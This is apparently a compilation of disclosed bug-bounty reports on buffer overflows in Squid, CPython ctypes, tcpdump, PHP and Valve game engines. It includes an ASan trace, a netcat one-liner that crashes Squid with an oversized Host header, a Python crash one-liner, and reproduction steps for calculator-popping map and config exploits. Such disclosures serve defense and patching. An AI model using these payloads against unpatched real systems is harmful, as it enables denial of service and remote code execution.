    #12 0x563906dc96e7 in StoreEntry::getPublicByRequest(StoreClient*, HttpRequest*) /home/j1/h4x/squid/releases/squid-4.8/src/store.cc:524
    #13 0x563906bb716e in clientReplyContext::identifyStoreObject() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_reply.cc:1667
    #14 0x563906bb8cab in clientGetMoreData /home/j1/h4x/squid/releases/squid-4.8/src/client_side_reply.cc:1813
    #15 0x563906bead08 in clientStreamRead(clientStreamNode*, ClientHttpRequest*, StoreIOBuffer) /home/j1/h4x/squid/releases/squid-4.8/src/clientStream.cc:182
    #16 0x563906bd20c6 in ClientHttpRequest::httpStart() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:1542
    #17 0x563906bd1c94 in ClientHttpRequest::processRequest() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:1528
    #18 0x563906bd528d in ClientHttpRequest::doCallouts() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:1896
    #19 0x563906bcc18a in ClientRequestContext::clientAccessCheckDone(allow_t const&) /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:830
    #20 0x563906bcacf5 in ClientRequestContext::clientAccessCheck2() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:729
    #21 0x563906bd383f in ClientHttpRequest::doCallouts() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:1781
    #22 0x563906bcc18a in ClientRequestContext::clientAccessCheckDone(allow_t const&) /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:830
    #23 0x563906bcae38 in clientAccessCheckDoneWrapper /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:741
    #24 0x563906f171b9 in ACLChecklist::checkCallback(allow_t) /home/j1/h4x/squid/releases/squid-4.8/src/acl/Checklist.cc:169
    #25 0x563906f15b23 in ACLChecklist::completeNonBlocking() /home/j1/h4x/squid/releases/squid-4.8/src/acl/Checklist.cc:54
    #26 0x563906f17c5b in ACLChecklist::nonBlockingCheck(void (*)(allow_t, void*), void*) /home/j1/h4x/squid/releases/squid-4.8/src/acl/Checklist.cc:257
    #27 0x563906bca91a in ClientRequestContext::clientAccessCheck() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:709
    #28 0x563906bd3255 in ClientHttpRequest::doCallouts() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:1753
    #29 0x563906bc87b9 in ClientRequestContext::hostHeaderVerify() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:600

SUMMARY: AddressSanitizer: heap-buffer-overflow (/usr/lib/gcc/x86_64-pc-linux-gnu/9.2.0/libasan.so.5+0x9feec) 
Shadow bytes around the buggy address:
  0x0c4280004ed0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c4280004ee0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c4280004ef0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c4280004f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c4280004f10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c4280004f20: 00 00 00 00 00 00 00 00 00 00 00[fa]fa fa fa fa
  0x0c4280004f30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c4280004f40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c4280004f50: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c4280004f60: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c4280004f70: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==4723==ABORTING
```

## Analysis

When handling an URN request from a user Squid makes a request to the remote
server to retrieve a list of URLs. The response is handled via urnHandleReply.

The response from the server is buffered into urnState->reqbuf as Squid reads
data in. This buffer is of length URN_REQBUF_SZ 4096

urnHandleReply can be called into multiple times as it waits for
urlres_e->store_status != STORE_PENDING and the current offset into reqbuf
held by urnState->reqofs is less than URN_REQBUF_SZ.

```
    if (urlres_e->store_status == STORE_PENDING &&
            urnState->reqofs < URN_REQBUF_SZ) {
        tempBuffer.offset = urnState->reqofs;
        tempBuffer.length = URN_REQBUF_SZ;
        tempBuffer.data = urnState->reqbuf + urnState->reqofs;
        storeClientCopy(urnState->sc, urlres_e,
                        tempBuffer,
                        urnHandleReply,
                        urnState);
        return;
    }
```
urnHandleReply will prepare a StoreIOBuffer object filling it with urnState
buffer, reqofs, and how the length.

Unfortunately this tempBuffer has the total length of urnState->reqbuf
URN_REQBUF_SZ, instead of the amount of data that is left. Whenever the
response is being copied a second time into the buffer it can overflow. The 
attacker can control how much is overflowed by adjusting the response.

## Impact

This overflow has 2 useful features for someone trying to exploit Squid. The
first obvious one being overflowing into an adjacent memory region. An
attacker that was able to align the heap in such a way that a virtual table
pointer was after the urnState object could gain control of the instructor
pointer, thus, gaining control of the Squid process.

The second is that before urnState overflows into that adjacent object it will
overflow the pointer urlres within itself. This pointer later is free'd. An
attacker with knowledge of current addresses in Squid could use this to
trigger a Use-After-Free.

---

### [Squid as reverse proxy RCE and data leak](https://hackerone.com/reports/778610)

- **Report ID:** `778610`
- **Severity:** Critical
- **Weakness:** Classic Buffer Overflow
- **Program:** Internet Bug Bounty
- **Reporter:** @guido
- **Bounty:** - usd
- **Disclosed:** 2021-08-26T23:10:11.757Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
This was a very difficult experience as Squid maintainers took a long time to answer. I tried getting help from HackerOne support, Dropbox support and the Internet Bug Bounty (never e-mailed me back) to no avail. What could have taken a few days took months.

The vulnerability concerns a stack buffer overflow (write) in parsing of the Host header if Squid acts as a reverse proxy.

The bug is fixed in Squid 4.10 released on 20 Jan 2020 which can be found here: http://www.squid-cache.org/Versions/v4/

## Steps To Reproduce:
```
mkdir squid-poc
cd squid-poc/
wget 'https://github.com/squid-cache/squid/archive/SQUID_4_8.tar.gz'
tar zxf SQUID_4_8.tar.gz
mkdir squid-install
cd squid-SQUID_4_8/
autoreconf -if
./configure --prefix=$(realpath ../squid-install)
make -j$(nproc)
make install
cd ../squid-install/sbin/
```

Create a file ```squid.conf``` with this contents. This is based on the instructions at https://wiki.squid-cache.org/ConfigExamples/Reverse/BasicAccelerator

```
http_port 9999 accel defaultsite=127.0.0.1 vhost vport=1
cache_peer 127.0.0.1 parent 80 0 no-query originserver name=myAccel
acl our_sites dstdomain your.main.website.name
http_access allow our_sites
cache_peer_access myAccel allow our_sites
cache_peer_access myAccel deny all
```

Run Squid:

The following is a oneliner to launch Squid and send the payload that crashes it:

```
./squid -N -f squid.conf & sleep 1 && echo -en "GET / HTTP/1.1\x0D\x0AHost: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:\x0D\x0A\x0D\x0A" | nc localhost 9999
```

Output:

```
[1] 19871
*** buffer overflow detected ***: ./squid terminated
[1]+  Aborted                 (core dumped) ./squid -N -f squid.conf
```

## Supporting Material/References:

Exploitation with -fstack-protector enabled is impossible.
Some compilers don't enable -fstack-protector by default (like Clang without optimization flags).

Without stack protector, exploitation is relatively easy on 32 bit as valid addresses normally don't require a leading zero byte (which cannot be written by the payload, because the affected code treats it as a null-terminated string).
On 64 bit it is more difficult, but not necessarily impossible. Rather than overwriting the return address, changing the value of a (for instance boolean) configuration variable may be used.

Unlike glibc, musl libc is used does not write a NULL byte to the destination buffer if the size argument is very large, which happens here due to an overflowing subtraction. Hence, exploitation may be easier on systems that use musl libc, like OpenWRT and Alpine Linux.

There is also a small data leak for payloads of a particular length. This does not crash Squid, and makes it return uninitialized bytes located after the string buffer, usually just several (until a NULL byte is reached).

Fix: https://github.com/squid-cache/squid/pull/519

## Impact

Remote code execution (under certain circumstances), crashing a server (under most circumstances), leaking data from the server (under most circumstances).

---

### [Buffer overflow in PyCArg_repr in _ctypes/callproc.c for Python 3.x to 3.9.1](https://hackerone.com/reports/1084342)

- **Report ID:** `1084342`
- **Severity:** High
- **Weakness:** Classic Buffer Overflow
- **Program:** Internet Bug Bounty
- **Reporter:** @jordyzomer
- **Bounty:** 1500 usd
- **Disclosed:** 2021-08-25T20:32:53.759Z
- **CVE(s):** CVE-2021-3177

**Vulnerability Information:**

**TL;DR Description**

Python 3.x through 3.9.1 has a buffer overflow in PyCArg_repr in _ctypes/callproc.c, which may lead to remote code execution in certain Python applications that accept floating-point numbers as untrusted input, as demonstrated by a 1e300 argument to c_double.from_param. This occurs because sprintf is used unsafely. The CVE number used for this vulnerability is CVE-2021-3177.

**Details**

There's a buffer overflow in the PyCArg_repr() function in _ctypes/callproc.c.

The buffer overflow happens due to not checking the length of th sprintf() function on line: 

    case 'd':
        sprintf(buffer, "<cparam '%c' (%f)>",
            self->tag, self->value.d);
        break;

Because we control self->value.d we could make it copy _extreme_ values. For example we could make it copy 1e300 which would be a 1 with 300 zero's  to overflow the buffer.

This could potentially cause RCE when a user allows untrusted input in these functions.

**Proof of Concept**

>>> from ctypes import *
>>> c_double.from_param(1e300)
*** buffer overflow detected ***: terminated
Aborted


**References**

    MISC:https://bugs.python.org/issue42938
    MISC:https://github.com/python/cpython/pull/24239
    MISC:https://python-security.readthedocs.io/vuln/ctypes-buffer-overflow-pycarg_repr.html

## Impact

**Availability**

Buffer overflows generally lead to crashes. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop.


**Access Control**

Buffer overflows often can be used to execute arbitrary code, which is usually outside the scope of a program’s implicit security policy.

**Other**

 When the consequence is arbitrary code execution, this can often be used to subvert any other security service.

---

### [Several protocol parsers in before 4.9.2 could cause a buffer overflow in util-print.c:bittok2str_internal()](https://hackerone.com/reports/800324)

- **Report ID:** `800324`
- **Severity:** Critical
- **Weakness:** Classic Buffer Overflow
- **Program:** Internet Bug Bounty
- **Reporter:** @bags
- **Bounty:** - usd
- **Disclosed:** 2021-08-22T03:50:13.318Z
- **CVE(s):** -

**Vulnerability Information:**

Length of a local buffer used to parse network packets was not validated against actual payload size leading to a classic buffer overflow.

P.S. I was not aware of this bounty program at the time of reporting. Is this report in scope? I have a few more reports that were originally sent to the tcpdump security mailing list, I could file a report for each of them here if that qualifies. I may have also helped fix some issues in 4.9.3 as well.

## Impact

I believe remote DoS is possible. Remote code execution remains a possibility but I have not checked this myself.

---

### [Buffer Overflow in ext_lm_group_acl helper](https://hackerone.com/reports/789034)

- **Report ID:** `789034`
- **Severity:** High
- **Weakness:** Classic Buffer Overflow
- **Program:** Internet Bug Bounty
- **Reporter:** @aaron_costello
- **Bounty:** - usd
- **Disclosed:** 2021-07-28T18:44:41.421Z
- **CVE(s):** CVE-2020-8517

**Vulnerability Information:**

## Summary

Due to incorrect buffer management ext_lm_group_acl is vulnerable to a denial of service attack when processing NTLM Authentication credentials. This problem is limited to installations using the
ext_lm_group_acl binary.

## Affected Versions

Squid 2.x -> 2.7.STABLE9
Squid 3.x -> 3.5.28
Squid 4.x -> 4.9

## Severity 

Due to incorrect input validation the NTLM authentication credentials parser in ext_lm_group_acl may write to memory outside the credentials buffer. On systems with memory access protections this can result in the helper process being terminated unexpectedly. Resulting in the Squid process also terminating and a denial of service for all clients using the proxy.

## Supporting Material/References:

Advisory : http://www.squid-cache.org/Advisories/SQUID-2020_3.txt

## Remediation

An official patch is available from the Squid archives for both Squid 3.5 and Squid 4. 

## Timeline

2019-11-11 : I reported the issue
2019-11-18 : I made a PR on GitHub with a fix
2019-11-22 :  Fix was merged

## Impact

See 'Severity' section of report.

---

### [[Portal 2] Remote Code Execution via voice packets](https://hackerone.com/reports/733267)

- **Report ID:** `733267`
- **Severity:** Critical
- **Weakness:** Classic Buffer Overflow
- **Program:** Valve
- **Reporter:** @gamer7112
- **Bounty:** 5000 usd
- **Disclosed:** 2021-05-10T18:18:11.771Z
- **CVE(s):** -

**Summary (team):**

#Description
RCE can be achieved on other players via voice packets due to the lack of length validation when reading into a stack based buffer.

#POC
1. As the victim, invite the attacker into a game. 
2. Wait until both players have loaded into the game.
3. Inject the following DLL into the attackers portal 2 process: {F630586} (source code: {F630587})
4. View that calc has been opened on the victims computer.

If these steps are followed correctly the outcome should look like so
{F630585}

#Vulnerable Code
```cpp
bool CGameClient::ProcessVoiceData( CLC_VoiceData *msg )
{
	char voiceDataBuffer[4096];

	msg->m_DataIn.ReadBits( voiceDataBuffer, msg->m_nLength );

	SV_BroadcastVoiceData( this, Bits2Bytes(msg->m_nLength), voiceDataBuffer, msg->m_xuid ); // length is in bits

	return true;
}
```

## Impact

RCE allows arbitrary code execution on the attacker's victim.

---

### [Specially Crafted Closed Captions File can lead to Remote Code Execution in CS:GO and other Source Games](https://hackerone.com/reports/463286)

- **Report ID:** `463286`
- **Severity:** Critical
- **Weakness:** Classic Buffer Overflow
- **Program:** Valve
- **Reporter:** @gamer7112
- **Bounty:** 7500 usd
- **Disclosed:** 2021-05-05T00:45:09.688Z
- **CVE(s):** -

**Summary (team):**

With a specially crafted closed captions file, the parser calls CHudCloseCaption::GetNoRepeatValue which in turn calls CHudCloseCaption::SplitCommand which has no boundary checks allowing the on stack variables cmd and args to be overflowed which in turn allows Remote Code Execution.

**Summary (researcher):**

Buffer overflow via the closed captioning system in the function `CHudCloseCaption::SplitCommand` which can be reached via the function `CHudCloseCaption::GetNoRepeatValue`
```cpp
bool CHudCloseCaption::GetNoRepeatValue( const wchar_t *caption, float &retval )
{
	retval = 0.0f;
	const wchar_t *curpos = caption;
	
	for ( ; curpos && *curpos != L'\0'; ++curpos )
	{
		wchar_t cmd[ 256 ];
		wchar_t args[ 256 ];

		if ( SplitCommand( &curpos, cmd, args ) )//Vulnerable call
		{
			if ( !wcscmp( cmd, L"norepeat" ) )
			{
				retval = (float)wcstod( args, NULL );
				return true;
			}
			continue;
		}
	}
	return false;
}

bool CHudCloseCaption::SplitCommand( wchar_t const **ppIn, wchar_t *cmd, wchar_t *args ) const
{
	const wchar_t *in = *ppIn;
	const wchar_t *oldin = in;

	if ( in[0] != L'<' )
	{
		*ppIn += ( oldin - in );
		return false;
	}

	args[ 0 ] = 0;
	cmd[ 0 ]= 0;
	wchar_t *out = cmd;
	in++;
	while ( *in != L'\0' && *in != L':' && *in != L'>' && !V_isspace( *in ) )
	{
		*out++ = *in++;//Vulnerable overflow
	}
	*out = L'\0';

	if ( *in != L':' )
	{
		*ppIn += ( in - oldin );
		return true;
	}

	in++;
	out = args;
	while ( *in != L'\0' && *in != L'>' )
	{
		*out++ = *in++;//Vulnerable overflow
	}
	*out = L'\0';

	//if ( *in == L'>' )
	//	in++;

	*ppIn += ( in - oldin );
	return true;
}
```

---

### [Android App Crashes while sending message to users/ on channel ](https://hackerone.com/reports/832217)

- **Report ID:** `832217`
- **Severity:** High
- **Weakness:** Classic Buffer Overflow
- **Program:** Rocket.Chat
- **Reporter:** @legalizenepal
- **Bounty:** - usd
- **Disclosed:** 2021-03-18T13:03:48.953Z
- **CVE(s):** -

**Vulnerability Information:**

## Description
 I found a security vulnerability in Rocket's latest android app by which I was able to remotely crash any  user’s app  instantly just by just sending a simple message in private or in channel. The vulnerability  require the victim open the message. 


## Devices and Versions

Rocket.Chat.Android version: (e.g. 4.5.1)
Mobile device model and OS version: (tested on :+1: -- " **Android 6.0, 8.0, 10.0**"), probably any other android version

## Steps to reproduce

> Create new #test channel
> Send POC Code onto the channel
> Open Mobile App
> App gets crashed

## POC
### Crafted code to crash mobile app
https://i.postimg.cc/zvBWdMzT/Screenshot-20200320-112405.png

### Message Preview
https://i.postimg.cc/fbCJ6KgC/Screenshot-20200320-112541.png

### App Gets Crashed
https://i.postimg.cc/26J8DXdQ/Screenshot-20200320-112711.png

### Code Link
https://pastebin.com/raw/JEDcC5Yr

**There is no such problem in iOS client and rocket web**

## Impact

An attacker could crash the internal chat user's phone, everytime he/she opens the rocket chat , i.e posting crafted code on #general channel

Hi, i even posted the issue on github, before i got to know about rocket chat on H1, but issue still not fixed, so just tryna keep you updated guys.

https://github.com/RocketChat/Rocket.Chat.ReactNative/issues/1907

---

### [phar_tar_writeheaders_int() buffer overflow](https://hackerone.com/reports/504761)

- **Report ID:** `504761`
- **Severity:** High
- **Weakness:** Classic Buffer Overflow
- **Program:** Internet Bug Bounty
- **Reporter:** @jordyzomer
- **Bounty:** 1500 usd
- **Disclosed:** 2020-11-09T01:46:01.959Z
- **CVE(s):** CVE-2019-9675

**Vulnerability Information:**

A buffer overflow has been found in the phar_tar_writeheaders_int() function.

it does a strncpy to header->linkname from entry->link with the size of entry->link.

As you can see in https://github.com/php/php-src/blob/master/ext/phar/tar.h#L66 , header->linkname is a char of the size 100. Once entry->link contains a value that's bigger than 100 it will overflow the _tar_header structure.

This can be fixed by setting the size argument of strncpy to sizeof(header->linkname) for example:

strncpy(header.linkname, entry->link, strlen(header->linkname);

This has been fixed in the following references:

https://github.com/php/php-src/commit/071e18c6971c4cf64297378b30b945a1b85d682a
http://git.php.net/?p=php-src.git;a=commit;h=e0f5d62bd6690169998474b62f92a8c5ddf0e699
https://bugs.php.net/bug.php?id=77586&edit=2

Kind Regards,

Jordy Zomer

## Impact

An attacker could overflow the buffer resulting in either a crash (DoS), EOP or RCE.

---

### [Uninitialized read in exif_process_IFD_in_TIFF](https://hackerone.com/reports/510336)

- **Report ID:** `510336`
- **Severity:** Critical
- **Weakness:** Classic Buffer Overflow
- **Program:** Internet Bug Bounty
- **Reporter:** @chamal
- **Bounty:** - usd
- **Disclosed:** 2020-10-10T02:18:18.265Z
- **CVE(s):** CVE-2019-9641

**Vulnerability Information:**

This bug can be reproduced only in 32 bit PHP builds.
This bug is present in exif_process_IFD_in_TIFF method of ext/exif/exif.c file.

Detailed description and steps to reproduce for this bug is present in bug report submitted to php.net.
Bug Report : https://bugs.php.net/bug.php?id=77509
PHP version : 7.1.26
CVE-ID : 2019-9641

## Impact

Uninitialized variables may leak data from memory.

---

### [[Half-Life 1] Malformed map name leads to memory corruption and code execution](https://hackerone.com/reports/402566)

- **Report ID:** `402566`
- **Severity:** High
- **Weakness:** Classic Buffer Overflow
- **Program:** Valve
- **Reporter:** @kbeckmann
- **Bounty:** 1500 usd
- **Disclosed:** 2020-09-22T17:28:14.792Z
- **CVE(s):** -

**Summary (team):**

A stack overflow takes place when map names with malformed names are listed which can be used to execute arbitrary code.

I made a Proof of Concept that executes gnome-calculator on Linux.

This was tested on `Half Life` 2018-08-29 on Linux, Ubuntu 18.04.

To reproduce:
- Extract the attached zip-file in the /valve/maps directory.
- Start `Half-Life`.
- Open the console and type `maps *`. This lists the installed maps.
- `gnome-calculator` should now execute.

You may also use the python script to generate a malformed mapname with the exploit.

Please see the enclosed video for a demonstration.

# Details about the bug
The callstack when the stack is overwritten is the following:

```
#4  0xf7c982d8 in sprintf () from /usr/lib32/libc.so.6
#5  0xf6454504 in COM_ListMaps (pszSubString=0x0) at ../engine/common.c:2857
#6  0xf6466f3a in Host_Maps_f () at ../engine/host_cmd.c:1511
#7  Host_Maps_f () at ../engine/host_cmd.c:1493
#8  0xf644e20d in Cmd_ExecuteString (
    text=0x41414141 <error: Cannot access memory at address 0x41414141>, src=<optimized out>)
    at ../engine/cmd.c:1149
#9  Cbuf_Execute () at ../engine/cmd.c:242
#10 0xf6464ed3 in _Host_Frame (time=0.0570053197) at ../engine/host.c:1384
#11 0xf6465382 in Host_Frame (time=0.0570053197, iState=1, stateInfo=0xffffcb6c)
    at ../engine/host.c:1522
#12 0xf64918c4 in CEngine::Frame (this=0xf66a88c0 <g_Engine>) at ../engine/sys_engine.cpp:245
#13 0xf648f3a3 in RunListenServer (instance=0x0, 
    basedir=0x804b220 <szBaseDir> "/home/konrad/.local/share/Steam/steamapps/common/Half-Life", cmdline=0x80534d0 "/home/konrad/.local/share/Steam/steamapps/common/Half-Life/hl_linux", 
    postRestartCmdLineArgs=0x804d360 <main::szNewCommandParams> "", launcherFactory=
    0x8049350 <CreateInterfaceLocal(char const*, int*)>, filesystemFactory=
    0xf76ccad0 <CreateInterface(char const*, int*)>) at ../engine/sys_dll2.cpp:946
#14 0x08048d67 in main (argc=1, argv=0xffffcda4) at ../launcher/launcher.cpp:439
```

## Impact

If a user installs the crafted map file and runs `maps *` in the console, then custom code can get executed that is not written by Valve, e.g. malware.

---

### [[GoldSrc] RCE via 'spk' Console Command](https://hackerone.com/reports/769014)

- **Report ID:** `769014`
- **Severity:** High
- **Weakness:** Classic Buffer Overflow
- **Program:** Valve
- **Reporter:** @gamer7112
- **Bounty:** 350 usd
- **Disclosed:** 2020-08-19T04:37:36.871Z
- **CVE(s):** -

**Summary (team):**

Details:
#Description
RCE can be achieved on clients via the 'spk' console command due to missing length checks before copying into a stack based buffer.

#POC
1. Place the attached cfg file in the root directory of the game: {F676967}
2. Launch the game and bring up the console with `~`
3. Type in `exec rce.cfg` and press enter
4. View calc pop 

#Vulnerable Code
The problem arises because `VOX_LoadSound` calls `VOX_GetDirectory` which copies into the stack buffer `szpath` without any length validation which leads to a buffer overflow.
```cpp

char *VOX_GetDirectory(char *szpath, char *psz)
{
	char c;
	int cb = 0;
	char *pszscan = psz + strlen(psz) - 1;

	// scan backwards until first '/' or start of string
	c = *pszscan;
	while (pszscan > psz && c != '/')
	{
		c = *(--pszscan);
		cb++;
	}

	if (c != '/')
	{
		// didn't find '/', return default directory
		strcpy(szpath, "vox/");
		return psz;
	}

	cb = strlen(psz) - cb;
	memcpy(szpath, psz, cb); // missing length validation
	szpath[cb] = 0;
	return pszscan + 1;
}

aud_sfxcache_t *VOX_LoadSound(aud_channel_t *pchan, char *pszin)
{
	char buffer[512];
	int i, j, k, cword;
	char	pathbuffer[64];
	char	szpath[32];
	aud_sfxcache_t *sc;
	voxword_t rgvoxword[CVOXWORDMAX];
	char *psz;

	if (!pszin)
		return NULL;

	memset(rgvoxword, 0, sizeof (voxword_t) * CVOXWORDMAX);
	memset(buffer, 0, sizeof(buffer));

	// lookup actual string in (*gAudEngine.rgpszrawsentence), 
	// set pointer to string data

	psz = VOX_LookupString(pszin, NULL);

	if (!psz)
	{
		gEngfuncs.Con_DPrintf ("VOX_LoadSound: no sentence named %s\n",pszin);
		return NULL;
	}

	// get directory from string, advance psz
	psz = VOX_GetDirectory(szpath, psz);

	if (strlen(psz) > sizeof(buffer) - 1)
	{
		gEngfuncs.Con_DPrintf ("VOX_LoadSound: sentence is too long %s\n",psz);
		return NULL;
	}

	// copy into buffer
	strncpy(buffer, psz, sizeof(buffer) - 1);
	buffer[sizeof(buffer) - 1] = 0;
	psz = buffer;

	// parse sentence (also inserts null terminators between words)
	
	VOX_ParseString(psz);

	// for each word in the sentence, construct the filename,
	// lookup the sfx and save each pointer in a temp array	

	i = 0;
	cword = 0;
	while (rgpparseword[i])
	{
		// Get any pitch, volume, start, end params into voxword

		if (VOX_ParseWordParams(rgpparseword[i], &rgvoxword[cword], i == 0))
		{
			// this is a valid word (as opposed to a parameter block)
			_snprintf(pathbuffer, sizeof(pathbuffer), "%s%s.wav", szpath, rgpparseword[i]);
			pathbuffer[sizeof(pathbuffer) - 1] = 0;

			if (strlen(pathbuffer) >= sizeof(pathbuffer))
				continue;

			// find name, if already in cache, mark voxword
			// so we don't discard when word is done playing
			rgvoxword[cword].sfx = S_FindName(pathbuffer, &(rgvoxword[cword].fKeepCached));
			cword++;
		}
		i++;
	}

	k = VOX_IFindEmptySentence();
	if (k < 0)
		return NULL;

	j = 0;
	while (rgvoxword[j].sfx != NULL)
		rgrgvoxword[k][j] = rgvoxword[j++];

	pchan->isentence = k;
	pchan->iword = 0;
	pchan->sfx = rgvoxword[0].sfx;

	sc = S_LoadSound(pchan->sfx, pchan);
	if (!sc)
	{
		S_FreeChannel(pchan);
		return NULL;
	}

	return sc;
}
```

## Impact

RCE allows for an attacker to execute any arbitrary code on a chosen victim.

---

### [[GoldSrc] RCE via malformed BSP file](https://hackerone.com/reports/763403)

- **Report ID:** `763403`
- **Severity:** High
- **Weakness:** Classic Buffer Overflow
- **Program:** Valve
- **Reporter:** @gamer7112
- **Bounty:** 450 usd
- **Disclosed:** 2020-08-19T03:29:14.573Z
- **CVE(s):** -

**Summary (team):**

#Description
RCE can be achieved via a malformed BSP file due to the lack of length validation when copying data from the BSP file into a stack based buffer.

#POC
1. Place the attached BSP {F666628} in the maps directory of the chosen GoldSrc game (czero/maps, cstrike/maps, tfc/maps, etc..)
2. Launch the game and bring up the console with ~
3. Type in `map de_RCE` and press enter
4. View calc pop

#Vulnerable Code
Within the following function, `COM_FileBase` copies data from `pszWadFile` into `wadName` without any length validation which leads to a buffer overflow.

```cpp
qboolean TEX_InitFromWad(char *path)
{
	char *pszWadFile;
	FileHandle_t texfile;
	char szTmpPath[1024];
	char wadName[260];
	char wadPath[260];
	wadinfo_t header;

	Q_strncpy(szTmpPath, path, 1022);
	szTmpPath[1022] = 0;
	if (!Q_strchr(szTmpPath, ';'))
		Q_strcat(szTmpPath, ";");
	for (pszWadFile = strtok(szTmpPath, ";"); pszWadFile; pszWadFile = strtok(NULL, ";"))
	{
		ForwardSlashes(pszWadFile);
		COM_FileBase(pszWadFile, wadName);//Vulnerable Function
		Q_snprintf(wadPath, 0x100u, "%s", wadName);
		COM_DefaultExtension(wadPath, ".wad");

		if (Q_strstr(wadName, "pldecal") || Q_strstr(wadName, "tempdecal"))
			continue;

		texfile = FS_Open(wadPath, "rb");
		texfiles[nTexFiles++] = texfile;
		if (!texfile)
			Sys_Error("%s: couldn't open %s\n", __func__, wadPath);

		Con_DPrintf("Using WAD File: %s\n", wadPath);
		SafeRead(texfile, &header, 12);
		if (Q_strncmp(header.identification, "WAD2", 4) && Q_strncmp(header.identification, "WAD3", 4))
			Sys_Error("%s: %s isn't a wadfile", __func__, wadPath);

		header.numlumps = LittleLong(header.numlumps);
		header.infotableofs = LittleLong(header.infotableofs);
		FS_Seek(texfile, header.infotableofs, FILESYSTEM_SEEK_HEAD);
		lumpinfo = (texlumpinfo_t *)Mem_Realloc(lumpinfo, sizeof(texlumpinfo_t) * (header.numlumps + nTexLumps));

		for (int i = 0; i < header.numlumps; i++, nTexLumps++)
		{
			SafeRead(texfile, &lumpinfo[nTexLumps], sizeof(lumpinfo_t));
			CleanupName(lumpinfo[nTexLumps].lump.name, lumpinfo[nTexLumps].lump.name);
			lumpinfo[nTexLumps].lump.filepos = LittleLong(lumpinfo[nTexLumps].lump.filepos);
			lumpinfo[nTexLumps].lump.disksize = LittleLong(lumpinfo[nTexLumps].lump.disksize);
			lumpinfo[nTexLumps].iTexFile = nTexFiles - 1;
		}

	}
	qsort(lumpinfo, nTexLumps, sizeof(texlumpinfo_t), lump_sorter);
	return 1;
}
```

## Impact

RCE can be used to execute any arbitrary code that an attacker could want to execute on any victim of choice.

---

### [Malformed BSP in GoldSrc Engine may cause shellcode injection](https://hackerone.com/reports/458929)

- **Report ID:** `458929`
- **Severity:** High
- **Weakness:** Classic Buffer Overflow
- **Program:** Valve
- **Reporter:** @kohtep2010
- **Bounty:** - usd
- **Disclosed:** 2020-03-25T22:03:24.144Z
- **CVE(s):** -

**Summary (team):**

### Introduction

Hello. There's a vulnerability in GoldSrc Engine that allows to run arbitrary assembly code using incorrect BSP format processing.

### Description

The vulnerability is found in the **UTIL_StringToIntArray** function. This function belongs to the game mod library (mp.dll/cs.so) and has the following call chain:

SV_LoadEntities -> ED_LoadFromFile -> ED_ParseEdict -> gEntityInterface.pfnKeyValue -> CGameText::KeyValue -> UTIL_StringToIntArray

The call of this function occurs at server start during processing of the entities of map being loaded. The vulnerability itself is a classic buffer overflow with the possibility of rewriting the return address to the address where the shellcode is located.

Vulnerability was tested on Windows 10 and it works successfully.

### How to reproduce

In order to reproduce the vulnerability, an attacker needs to perform an entity list correction within the BSP itself. As a demonstration, I took a **35hp_2** map, which uses the **game_text** entity, into which we can write the shellcode that runs OS calculator via WinExec function. You can see shellcode implementation on the image below.

{F387197}

When client connects to the HLDS, attacker will send malformed map to it. After client completes download, server will send console command **map 35hp_2_shell** to client, which will start a local server, causing the load of malformed map and the shellcode execution, since this command is not on the stufftext filter list.

To quickly check the work of the shellcode, it is enough just to put the malformed map in the **maps** folder of any mod (I used Counter-Strike 1.6, Steam) and execute the console command 'map 35hp_2_shell' manually.

I attached malformed map to report.

### Possible solutions

The argument **pString** needs to be checked for length. So, if it is larger than the buffer where the string is copied, then the function must be terminated. You can also simply replace the function strcpy with strncpy.

## Impact

An attacker can execute code remotely on a client machine using HLDS, or he can upload a malformed map to web-resources, that can lead to infection of users of the resource.

---

